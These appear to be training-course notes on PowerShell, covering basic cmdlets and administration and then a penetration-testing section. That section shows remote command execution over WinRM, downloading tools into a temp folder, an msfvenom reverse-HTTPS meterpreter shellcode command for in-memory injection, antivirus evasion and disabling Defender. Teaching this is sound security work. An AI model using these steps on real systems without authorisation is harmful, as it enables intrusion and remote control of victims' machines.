# PowerShell Scripting
#### OBJECTIVE  
- Review the basic concepts of PowerShell
- Explore scripts specific to pen testing
- Create and test PowerShell scripts

## PowerShell
#### Why use PowerShell?
- Powershell offers a well-integrated command-line experience for the operating system (OS).
- PowerShell allows complete access to all of the types in the .NET framework.
- Trusted by system administrators
- PowerShell is a simple framework to manipulate server and workstation components.
- It is geared toward system administrators because of its simple syntax.

- ```console
  PS C:\Users\gteksd> $PSVersionTable
  
  Name                           Value
  ----                           -----
  PSVersion                      5.1.26100.2161
  PSEdition                      Desktop
  PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
  BuildVersion                   10.0.26100.2161
  CLRVersion                     4.0.30319.42000
  WSManStackVersion              3.0
  PSRemotingProtocolVersion      2.3
  SerializationVersion           1.1.0.1
  ```
  
## PowerShell History
PowerShell version 1.0 was released in 2006. Since then, PowerShell's capabilities and hosting environments have grown significantly, and it is currently at version 5.1 (7 is also available but is not the default).

### Version-wise History of PowerShell 
- PowerShell 1.0 supported the local administration of Windows Server 2003. 
- PowerShell 2.0 was integrated with Windows 7 and Windows Server 2008 R2. This version supports remote computing and has enhanced capabilities such as transactions, background jobs, events, and debugging.
- PowerShell 3.0 was released as an internal part of the Windows management framework. It was integrated with Windows 8 and Windows Server 2012. In this version, the user can add and schedule jobs, session connectivity, automatic module loading, etc.
- PowerShell 4.0 shipped with Windows 8.1 and Windows Server 2012 R2. This version added support for the desired state configuration, enhanced debugging, and network diagnostics.
- PowerShell 5.0 was released as an internal part of Windows Management Framework 5. The features offered in this version include remote debugging, class definitions, and .NET enumerations.
- PowerShell Core 6.0 cross-platform (Windows, macOS, and Linux), open source, and built for heterogeneous environments and the hybrid cloud. It moved from.NET Framework to .NET Core.
- PowerShell 7 is the latest major update to PowerShell. As a cross-platform (Windows, Linux, and macOS) automation tool and configuration framework, it is optimized for dealing with structured data (e.g., JSON, CSV, XML), Representational state transfer (REST) application programming interfaces (APIs), and object models.
  
## PowerShell Features
Another great feature of PowerShell is it has a built-in secure shell (SSH) client.
- **PowerShell Remoting:** PowerShell allows scripts and cmdlets to be invoked on a remote machine.
- **Background Jobs:** It allows the asynchronous use of invoked scripts or pipelines. Jobs can be run either on the local machine or multiple remotely operated machines.
- **Transactions:** It supports cmdlets and allows developers to perform transactions.
- **Evening:** This command helps in listening, forwarding, and acting on management and system events.
- **Network File Transfer:** PowerShell offers native support for prioritized, asynchronous, throttled file transfer between machines using the Background Intelligent Transfer Service (BITS) technology

## PowerShell cmdlet
- A lightweight command used in the Windows-based PowerShell environment
- Invoked via the command line
- Can be created and invoked using PowerShell application programming interfaces (APIs)
- A cmdlet always consists of a verb and a noun separated with a hyphen
 - Get - to get something
 - Start - to run something
 - Out - to output something
 - Stop - to stop something that is running
 - Set - to define something
 - New - to create something

### Cmdlet vs. Command
A cmdlet is a series of commands, which is of more than one line, stored in a text file with a .ps1 extension. Most of PowerShell’s functionality originates from cmdlets, which are in the form of a verb and noun separated by a hyphen; further, cmdlets are always singular. Moreover, cmdlets return objects that are not text. Cmdlets are different from commands in other command-shell environments in the following aspects:

- Cmdlets are .NET Framework class objects that cannot be executed separately. 
- Cmdlets can be constructed from as few as a dozen lines of code. 
- Parsing, output formatting, and error presentation are not handled by cmdlets. 
- Cmdlets process input objects from the pipeline rather than from streams of text, and cmdlets typically deliver objects as output to the pipeline.
- Cmdlets are record-based; hence, it processes a single object at a time.

#### The following are some verbs used in PowerShell cmdlets: 
- **Get** - to get something 
- **Start** - to run something 
- **Out** - to output something 
- **Stop** - to stop something that is running 
- **Set** - to define something 
- **New** - to create something
  
## Important Commands

- `Get-Help` - Displays documentation on PowerShell commands and topics
- `Get-Command` - Displays information about anything that can be invoked
- `Get-Service` - Displays all cmdlets with the word “service” in it
- `Get-Member` - Shows what can be done with an object `Get-Service "vm*" | Get-Member`
 
The following are some additional important PowerShell commands: 
- `Get-Module` - shows packages of commands 
- `Get-Content` - takes a file and processes its contents to do something with it 
- `Get-get` - finds all cmdlets starting with “get-”

For example, the following command creates a folder:  
`New-Item -Path ‘X:\Kevin' -ItemType Directory`

```powershell
PS C:\Users\gteksd> Get-Help

TOPIC
    Windows PowerShell Help System

SHORT DESCRIPTION
    Displays help about Windows PowerShell cmdlets and concepts.

LONG DESCRIPTION
    Windows PowerShell Help describes Windows PowerShell cmdlets,
    functions, scripts, and modules, and explains concepts, including
    the elements of the Windows PowerShell language.

    Windows PowerShell does not include help files, but you can read the
    help topics online, or use the Update-Help cmdlet to download help files
    to your computer and then use the Get-Help cmdlet to display the help
    topics at the command line.

    You can also use the Update-Help cmdlet to download updated help files
    as they are released so that your local help content is never obsolete.

    Without help files, Get-Help displays auto-generated help for cmdlets,
    functions, and scripts.
-- More  --
```
```powershell
PS C:\Users\gteksd> Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Add-AppPackage                                     2.0.1.0    Appx
Alias           Add-AppPackageVolume                               2.0.1.0    Appx
Alias           Add-AppProvisionedPackage                          3.0        Dism
Alias           Add-MsixPackage                                    2.0.1.0    Appx
Alias           Add-MsixPackageVolume                              2.0.1.0    Appx
Alias           Add-MsixVolume                                     2.0.1.0    Appx
Alias           Add-ProvisionedAppPackage                          3.0        Dism
Alias           Add-ProvisionedAppSharedPackageContainer           3.0        Dism
Alias           Add-ProvisionedAppxPackage                         3.0        Dism
Alias           Add-ProvisioningPackage                            3.0        Provisioning
Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
Alias           Apply-WindowsUnattend                              3.0        Dism
Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
Alias           Disable-PhysicalDiskIndication                     1.0.0.0    VMDirectStorage
Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
Alias           Disable-StorageDiagnosticLog                       1.0.0.0    VMDirectStorage
Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
Alias           Dismount-MsixPackageVolume                         2.0.1.0    Appx
Alias           Dismount-MsixVolume                                2.0.1.0    Appx
Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
Alias           Enable-PhysicalDiskIndication                      1.0.0.0    VMDirectStorage
Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
Alias           Enable-StorageDiagnosticLog                        1.0.0.0    VMDirectStorage
Alias           Flush-Volume                                       2.0.0.0    Storage
Alias           Flush-Volume                                       1.0.0.0    VMDirectStorage
Alias           Get-AppPackage                                     2.0.1.0    Appx
-- More  --
```

### Special Variables

Special Variables | Description 
--- | ---
$Error | An array of error objects that display the most recent errors 
$Host | Displays the name of the current hosting application 
$Profile | Stores the entire path of a user profile for the default shell 
$PID | Stores the process identifier 
$PSUICulture | Holds the name of the current UI culture 
$NULL | Contains empty or NULL value 
$False | Contains FALSE value 
$True | Contains TRUE value 

## PowerShell Scripts
PowerShell scripts are stored in .ps1 files. By default, scripts cannot be run by simply double-clicking a file. This feature protects the system from accidental harm. To execute a script, right-click the file and click “Run with PowerShell.” This will result in one of the following outputs.  

The screenshot shows the output we wish to see when accessing a machine. 
```console
PS C:\Users\gteksd> Get-ExecutionPolicy
Restricted
```
- `Get-ExecutionPolicy`
  - `Restricted` - No scripts are allowed. This is the default setting; therefore, this output will be displayed on running the script for the first time.
  - `AllSigned` - Scripts signed by a trusted developer can be run. With this setting, a script will ask for confirmation before executing.
  - `RemoteSigned` - The user’s own scripts or scripts signed by a trusted developer can be run.
  - `Unrestricted` - Any script can be run.

## PowerShell Integrated Scripting Environment
- Default editor and scripting environment for PowerShell versions up to 6.0
- PowerShell versions 6.0 and later do not support the integrated scripting environment (ISE). Visual Studio Code with the PowerShell Extension is a good replacement.
- PowerShell Extension
  - This extension provides rich PowerShell language support for Visual Studio Code. It allows the user to write and debug PowerShell scripts using the excellent IDE-like interface that Visual Studio Code provides.

The Windows PowerShell Integrated Scripting Environment (ISE) is the default editor for Windows PowerShell. With this ISE, the user can run commands, write tests, and debug scripts in a window-based graphical user interface (GUI) environment. It supports multiline editing, syntax coloring, tab completion, selective execution, and many other features. 

Windows PowerShell ISE also allows the execution of commands in a console pane. It also supports panes that can be used to simultaneously view the source code of the user’s script and other tools plugged into the ISE. It even allows the user to open multiple script windows at the same time, which is specifically useful when debugging a script that uses functions defined in other scripts or modules. 

The ISE can be used in PowerShell versions up to 6.0; later versions use Visual Studio Code with the PowerShell extension.

### PowerShell vs. Command Prompt 

PowerShell	|	Command Prompt
---	|	---
PowerShell deeply integrates with the Windows OS. It offers an interactive command-line interface and scripting language	|	Command Prompt is a default command-line interface provided by Microsoft. It is a simple win32 application that can interact with any win32 object in the Windows OS.
PowerShell uses cmdlets. They can be invoked either in the runtime environment or automation scripts.	|	No such features are offered by command prompt.
PowerShell considers cmdlets as objects. The output can be passed as an input to other cmdlets through the pipeline.	|	In Command Prompt or even the *nix shell, the output generated from a cmdlet is not just a stream of text but a collection of objects.
PowerShell is very advanced in terms of features, capabilities, and inner functioning.	|	Command Prompt is very basic. Copyright 

### PowerShell Administrative
- `New-LocalUser`
- This cmdlet creates a local user account or a local user account connected to a Microsoft account.
- Create a user account:
  ```powershell
  $Password = Read-Host -AsSecureString
  New-LocalUser "User03" -Password $Password -FullName "Third User" -Description "Description of this account"
  ```
- Name | Enabled | Description
  -----|---------|------------
  User03 | True | Description of this account

### Netsh 
1. Netsh is a command-line scripting utility that allows the user to display or modify the network configuration of a computer that is currently running.
2. Netsh interacts with other OS components by using dynamic-link library (DLL) files.
3. Each netsh helper DLL provides an extensive set of features called a context. 

### Netsh as a Sniffer
- Can start packet capture from the command line
- ```console
  netsh trace start capture=yes
  ```

### Netsh Examples 
- Show all ports allowed by the firewall:
  ```console
  netsh firewall show portopening
  ```
- Show all configuration options for the firewall:
  ```console
  netsh firewall show config
  ```
- Show all programs allowed by the firewall:
  ```console
  netsh firewall show allowedprogram
  ```
- Reset TCP/IP stack:
  ```console
  netsh int ip reset
  ```

### Replace netsh with Powershell
```console
Net-Adapter NetTCPIP
Get-NetAdapter -Name "Wi-Fi" | Get-NetIPAddress
``` 
```console
PS C:\Users\gteksd> Get-NetAdapter

Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
----                      --------------------                    ------- ------       ----------             ---------
Bluetooth Network Conn... Bluetooth Device (Personal Area Netw...      18 Disconnected 69-G9-23-AF-VF-B1         3 Mbps
Wi-Fi                     Intel(R) Wi-Fi 6 AX201 160MHz                17 Up           70-D8-23-AF-7F-AD     866.7 Mbps
Ethernet                  Realtek PCIe GbE Family Controller           16 Disconnected C0-18-69-F7-EB-74          0 bps
Firewall                  Fortinet Virtual Ethernet Adapter (N...      15 Disconnected 00-69-0F-FE-00-01       100 Mbps
```
```console
PS C:\Users\gteksd> Get-NetAdapter -Name "Ethernet" | Get-NetIPAddress

IPAddress         : fe80::6969:69e0:b6b9:c609%10
InterfaceIndex    : 16
InterfaceAlias    : Ethernet
AddressFamily     : IPv6
Type              : Unicast
PrefixLength      : 69
PrefixOrigin      : WellKnown
SuffixOrigin      : Link
AddressState      : Deprecated
ValidLifetime     :
PreferredLifetime :
SkipAsSource      : False
PolicyStore       : ActiveStore

IPAddress         : 169.169.169.169
InterfaceIndex    : 16
InterfaceAlias    : Ethernet
AddressFamily     : IPv4
Type              : Unicast
PrefixLength      : 16
PrefixOrigin      : WellKnown
SuffixOrigin      : Link
AddressState      : Tentative
ValidLifetime     :
PreferredLifetime :
SkipAsSource      : False
PolicyStore       : ActiveStore
```

### Net-Adapter Commands
- List all adapters:
  - ```console
    Get-NetAdapter
    ```
- List a specific adapter:
  - ```console
    Get-NetAdapter –name “ethernet”
    ```
- Get hardware info:
  - ```console
    Get-NetAdapterHardwareInfo
    ```
- Get IP address and Domain Name System (DNS) information:
  - ```console
    Get-NetAdapter -Name "Local Area Connection" | Get-NetIPAddress
    ```
 
## Basic PowerShell Commands
- `Get-Help` Help on commands
- `Get-Item` Used to get a file
  - `Get-Item C:`
- Read the contents of a file:
  - `Get-Content <PATH of the file with its extension>`
- Copy a file:
  - `Copy-Item “C:\Test.txt" - Destination "D:\"`

```console
PS C:\Users\gteksd> Get-Content example.txt
Hi, World! Secure ur ass by learning cybersecurity.
```

# PowerShell Pen Testing 

- .NET functionality
- Allows us to manipulate Windows with its own tool! 😄
- We do not have to load anything!
  - It is already there waiting for us!

PowerShell is an incredibly flexible tool with built-in functions that support systems administration, interaction with remote systems, and can even access functions within the Windows API.

Here, we will examine how to access a system and what can be done with PowerShell after gaining access. We will cover some sample uses of PowerShell, such as controlling processes and services, interfacing with the event logs, receiving and sending files over a network, and interfacing with the Registry, as well as examples of what can be done using PowerShell and the Metasploit attack framework.

It is important to understand that PowerShell provides pen testers with amazing capabilities, but as time has passed, many of the things we have become used to being able to do with PowerShell may or may not still work. As with any test, information gathering is critical to success.

## Execution Policies
- We can potentially bypass, depending on the settings.
- There are techniques to defeat the signing.
  - Still prompts when first run
  - Not ideal
- CreateCMD
  - One of the first tools to bypass
    - Demonstrated in 2010
      - DEFCON

Ideally, the execution policy would be set to Unrestricted, Bypass, or at least RemoteSigned so that scripts can be run on the target system.  
There are methods to defeat the signing, but these depend on the version and admin settings.  
In a penetration test, it may not always be desirable or possible to change the system settings. Thankfully, there is a method to circumvent this issue that requires no changes at all. The method leaves the system in its original state but lets us run any script.

## Interaction with Windows
- In most cases, we need an attack surface.
- Requires the machine to have remote administration: WinRM
- Remote Desktop Protocol (RDP) might be the vector
- Python tool: prywinrm
```python
#!/usr/bin/python
import winrm
script = """
whoami
"""
ses = winrm.Session('<host IP>', auth=(<username>,'<password>'))
r = ses.run_ps(script)
print r.std_out
print r.std_err
```
As this slide shows, the pen tester is at the mercy of the admin; if the admin has locked the machine, then it will be much more difficult to access it.  
This script begins with the import of the `winrm` module to enable interaction with the remote Windows 10 system. We then create our script, which only has the command "`whoami`" to print out who we are authenticated as. Finally, we create a new session with the `Session` command.  
That session is then used to run our script, and the return information is stored in the return variable, "`r.`" This return variable has three pieces of information about the command that was run: `status_code`, the `std_out` output, and the `std_err` error output. The outputs of both `std_out` and `std_err` are printed to observe both the command outputs and any errors that occurred. Subsequently, the remote machine is used as a client connected to our Windows machine.

## Control of Processes and Services
PowerShell provides this capability directly from the command line or from our remote connection with pywinrm.  
```python
import winrm
script = """
Get-WmiObject Win32_Process|select ProcessId, ProcessName, ComandLine | `
    Sort-Object ProcessId
"""
```
The ability to create and destroy processes as well as interact with services is one of the key capabilities required in a pen test. Frequently, we will have to run commands to gain additional insight into systems or to further our access. This section continues to focus on WinRM scripts, but the PowerShell we are running can be used directly from the PowerShell on the remote system as well. Let us start with an example of gathering a remote process list. 

This script uses the **Get-WmiObject** cmdlet to retrieve the process table from the system. This cmdlet returns a large amount of information about running processes, but only a subset is important for the present purposes. The **Select** cmdlet allows us to choose only certain fields to display. The fields to display are limited the **ProcessId, ProcessName,** and **CommandLine** fields. Finally, these processes must be sorted by their **ProcessId** to enable the use of the Sort-Object cmdlet to sort the output by **ProcessId.**

## Working with Event Logs
- `Get-EventLog –List`
- `Get-EventLog –newest 5`
- `Get-EventLog -LogName System -EntryType Error`

```console
PS C:\Users\gteksd> Get-EventLog –List

  Max(K) Retain OverflowAction        Entries Log
  ------ ------ --------------        ------- ---
  20,480      0 OverwriteAsNeeded       4,389 Application
  20,480      0 OverwriteAsNeeded           0 HardwareEvents
     512      7 OverwriteOlder              0 Internet Explorer
  20,480      0 OverwriteAsNeeded           0 Key Management Service
     128      0 OverwriteAsNeeded          44 OAlerts
     512      7 OverwriteOlder            595 OneApp_IGCC
     512      7 OverwriteOlder            727 RefreshRateService_log
                                              Security
  20,480      0 OverwriteAsNeeded       6,949 System
     512      7 OverwriteOlder              1 USER_ESRV_SVC_QUEENCREEK
  15,360      0 OverwriteAsNeeded       2,296 Windows PowerShell
```
```console
PS C:\Users\gteksd> Get-EventLog –newest 5

cmdlet Get-EventLog at command pipeline position 1
Supply values for the following parameters:
LogName: application

   Index Time          EntryType   Source                 InstanceID Message
   ----- ----          ---------   ------                 ---------- -------
    4389 Jan 17 00:16  Information Software Protecti...   1073758208 Successfully scheduled Software Protection serv...
    4388 Jan 17 00:15  Information Software Protecti...   3221241866 Offline downlevel migration succeeded.
    4387 Jan 17 00:13  Information Software Protecti...   1073758208 Successfully scheduled Software Protection serv...
    4386 Jan 17 00:12  Information Software Protecti...   3221241866 Offline downlevel migration succeeded.
    4385 Jan 16 23:50  Information igcc                            0 PowerEvent handled successfully by the service.
```
```console
PS C:\Users\gteksd> Get-EventLog -LogName System -EntryType Error

   Index Time          EntryType   Source                 InstanceID Message
   ----- ----          ---------   ------                 ---------- -------
    6890 Jan 16 23:34  Error       Microsoft-Windows...           20 Installation Failure: Windows failed to install...
    6802 Jan 16 22:18  Error       Microsoft-Windows...         1796 The Secure Boot update failed to update a Secur...
    6801 Jan 16 22:16  Error       Service Control M...   3221232506 The Energy Server Service queencreek service te...
    6795 Jan 16 22:13  Error       Service Control M...   3221232483 A timeout (30000 milliseconds) was reached whil...
    6760 Jan 15 23:19  Error       DCOM                        10029 The description for Event ID '10029' in Source ...
    6647 Jan 15 22:19  Error       Microsoft-Windows...         1796 The Secure Boot update failed to update a Secur...
    6645 Jan 15 22:18  Error       DCOM                        10029 The description for Event ID '10029' in Source ...
    6643 Jan 15 22:15  Error       Service Control M...   3221232506 The Energy Server Service queencreek service te...
    6633 Jan 15 22:13  Error       Service Control M...   3221232483 A timeout (30000 milliseconds) was reached whil...
    6554 Jan 13 21:44  Error       Microsoft-Windows...         1796 The Secure Boot update failed to update a Secur...
    6325 Jan 12 10:06  Error       Service Control M...   3221232483 A timeout (30000 milliseconds) was reached whil...
```

It is quite easy to work with event logs in PowerShell. Microsoft provides a simple interface to work with event logs, although it has a few limitations. Again, we examine how to work with event logs in PowerShell in the interactive mode, just as we did earlier in this section with processes. The first task to perform with event logs on the target system is likely to examine what is running on the system. For this purpose, we can use `Get-EventLog cmdlet` with the list argument: `Get-EventLog –List`.  
Conveniently, with the list of event logs, the same cmdlet can be used with a different argument to list the content of a specific log. When examining a log on a given system, there will likely be a very large amount of information in it; thus, the returned information must be filtered, unless the log contents are merely being dumped to a file. We can obtain the last few messages from the log that we specify by using the –newest argument with `Get-EventLog`: `Get-EventLog –newest 5`.

## Sending and Receiving Files
- We can use wget on Windows.
- It can be downloaded onto the machine via conventional means.
  - Remember we have ssh
- It can be downloaded using PowerShell scripting
```python
script = """
$src = "https://nmap.org/dist/nmap-7.95-setup.exe"
$dest = "c:/Windows/temp/nmap-7.95-setup.exe"

$web = New-Object System.Net.Webclient
$web.DownloadFi1e($src, $dest)
Is c:/windows/temp/nmap*
```
On gaining access to a system during a penetration test, it may be necessary to pull files onto the system to load additional tools locally or send information off the system for data exfiltration. PowerShell can be used to perform several types of network activity with relative ease. On a Linux system, one of the most useful tools to pull data from a Web server is `wget`. Its basic features can be replicated with a quick PowerShell script and some .NET coding, as long as we can write to the download location. 

We first assign the URL for our file to the $src variable. We also specify where we will save the file: **“C:/Windows/temp.”** When specifying the path in PowerShell, we use the “/” path syntax instead of “\” because “\” is an escape character. 

Next, we instantiate our object to interface with the Web, **System.Net.WebClient**, by using **$web** as a handle for it. This will allow us to interact with websites. The **WebClient** interface has several different ways to retrieve and upload data, but we use the **DownloadFile** method here. We specify the handle for our web object, passing the URL that we will be downloading and where we want to store it, as in **$web.DownloadFile($url, $path).** This is a fairly simple piece of code for handling Web traffic on a Windows machine.

## Interacting with the Registry
- We can manipulate the Registry via PowerShell.
- There are five main keys:
  - `HKEY_LOCAL_MACHINE (HKLM)` - holds settings for the local machine
  - `HKEY_CURRENT_CONFIG (HKCC)` - holds information generated at boot time
  - `HKEY_CLASSES_ROOT (HKCR)` - holds information about applications
  - `HKEY_USERS (HKU)` - holds the superset of HKEY_CURRENT_USER entries
  - `HKEY_CURRENT_USER (HKCU)` - holds settings that pertain to the currently logged-in user
- PowerShell displays the registry as a file system like in Linux 😄

The Registry in Microsoft operating systems (OSes), first developed for Windows 3.1, is a database that holds the configuration settings for Microsoft OSes and the applications installed on them. The Registry can be used to manipulate how applications function (or keep them from functioning), control what happens when the OS starts, and perform a variety of other similar tasks. The Registry is hierarchical in nature, often presented as a series of folders in graphical tools designed for accessing it. Each level of the hierarchy may contain additional levels, referred to as “keys,” as well as individual entries, referred to as “values.” The values are pairs containing a name and associated data. The Registry has five major sections, often referred to as “hives”: 
- **HKEY_LOCAL_MACHINE (HKLM)** - holds settings for the local machine 
- **HKEY_CURRENT_CONFIG (HKCC)** - holds information generated at boot time 
- **HKEY_CLASSES_ROOT (HKCR)** - holds information about applications 
- **HKEY_USERS (HKU)** - holds the superset of **HKEY_CURRENT_USER** entries 
- **HKEY_CURRENT_USER (HKCU)** - holds settings that pertain to the currently logged-in user

These hives are present in most Windows OSes, with some slight variations depending on the specific version in use; some hives are not accessible outside of APIs.

Only two hives are immediately accessible in PowerShell: 
- HKLM
- HKCU

## PowerShell and Metasploit
- Since PowerShell allows us to manipulate the Windows API, we can build shellcode.
- Powersploit
  - Uses the Windows API to inject the shellcode in a running process.
- msfvenom can be used to create the shellcode.
  - `msfvenom -f c -p windows/x64/meterpreter/reverse_https \`
  - `LHOST=<IP> LPORT=8675 EXITFUNC=thread | tr -d '“’ |\`
  - `perl -e 'while(<>){ $_ =~ s/\\x/,0x/g; print $_ ;}’\`
  - `| sed -e 's/^,//' | sed -e 's/;$//’`
- Once created, we place it in our script. 

One of the most powerful aspects of PowerShell is that we can rely on Windows APIs to perform tasks in the same manner as regular binaries. With antivirus software being so prevalent on today’s systems, importing a payload into a system and executing it can prove difficult. However, PowerShell can be used to ensure that the data can execute without ever having to be written to the file system.

We call `msfvenom` with C-style formatting by specifying the `-f` c option. The payload is specified with the `-p` option, following which the listening host (LHOST) and listening port (LPORT) are specified. 

Subsequently, we use `msfvenom` to create a payload that is threaded so that our process is not killed upon completion. The output from this will be a large block of code surrounded in quotation marks. Since the quotation marks are not required, we pipe the code into the `tr` command to delete the double quotes from the output. The following Perl statement helps with formatting by changing the format from `\x00 to 0x00` as well as adding commas between each pair of characters. The final two `sed` commands delete the first comma and the final semicolon in the code so that it can be copied cleanly. 

Be aware that Windows Defender continues to evolve, and it might block the execution. Therefore, ensure that it is disabled during testing. Furthermore, if Device Credential Guard is enabled, testing could be even more challenging.

# LAB PowerShell Scripting 

#### Module Summary
- Reviewed the basic concepts of PowerShell
- Explored scripts specific to pen testing
- Created and tested PowerShell scripts
